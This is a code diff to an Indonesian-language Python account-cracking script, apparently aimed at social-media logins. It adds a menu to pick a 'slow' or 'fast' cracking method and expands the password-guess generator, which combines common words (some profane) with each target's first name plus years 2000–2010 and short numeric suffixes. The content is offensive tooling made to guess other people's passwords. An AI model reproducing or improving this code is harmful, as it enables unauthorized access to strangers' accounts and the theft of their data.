@@ -1440,16 +1440,16 @@ def setting():
     else:
         ualuh.append("tidak")
 
-    # Pilihan kecepatan metode
-    metcepat()
-    #Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}",width=60,style=f"{color_panel}"))
-    #hc = console.input(f" {H2}• {P2}Masukan : ").strip()
-    #if hc in ["1", "01"]:
-        #metcepat()
-    #elif hc in ["2", "02"]:
-        #metcepat()
-    #else:
-        #metcepat()  # Default ke metode cepat
+     # Pilihan kecepatan metode
+    # metcepat()
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}",width=60,style=f"{color_panel}"))
+    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
+    if hc in ["1", "01"]:
+        metslow()
+    elif hc in ["2", "02"]:
+        metcepat()
+    else:
+        metcepat()  # Default ke metode cepat
         
 
 # -------------------[ CRACK-SLOW ]------------#
@@ -1491,32 +1491,34 @@ def metslow():
             for yuzong in id2:
                 idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                 frs = nmf.split(" ")[0]
-                pwv = [
-                    "pantek123",
-                    "indonesia123",
-                    "kontol123",
-                    "domino123",
-                    "anjing123",
-                    "sayangku",
-                    "maling123",
-                    "sayang123",
-                    "malang123",
-                    "bismillah123",
-                    "sayangku123",
-                    "bocilku123",
-                    "galaksi123",
-                    "hacker123",
-                ]
+                pwv = ["indonesia123","kontol123","sayang123","bismillah123","sayangku123"]
                 if len(nmf) < 6:
                     if len(frs) < 3:
                         pass
                     else:
                         pwv.append(nmf)
                         pwv.append(frs + "321")
+                        pwv.append(frs + "2000")
+                        pwv.append(frs + "2001")
+                        pwv.append(frs + "2002")
+                        pwv.append(frs + "2003")
+                        pwv.append(frs + "2004")
+                        pwv.append(frs + "2005")
+                        pwv.append(frs + "2006")
+                        pwv.append(frs + "2007")
+                        pwv.append(frs + "2008")
+                        pwv.append(frs + "2010")
+                        pwv.append(frs + "2009")
                         pwv.append(frs + "123")
                         pwv.append(frs + "1234")
                         pwv.append(frs + "12345")
                         pwv.append(frs + "123456")
+                        pwv.append(frs + "01")
+                        pwv.append(frs + "02")
+                        pwv.append(frs + "03")
+                        pwv.append(frs + "04")
+                        pwv.append(frs + "05")
+                        pwv.append(frs + "06")
                 else:
                     if len(frs) < 3:
                         pwv.append(nmf)
@@ -1596,7 +1598,7 @@ def metcepat():
             for yuzong in id2:
                 idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                 frs = nmf.split(" ")[0]
-                pwv = ["pantek123","indonesia123","kontol123","domino123","anjing123","sayangku","maling123","sayang123","malang123","bismillah123","sayangku123","bocilku123","galaksi123","hacker123"]
+                pwv = ["indonesia123","kontol123","sayang123","bismillah123","sayangku123"]
                 if len(nmf)<6:
                     if len(frs)<3:
                         pass
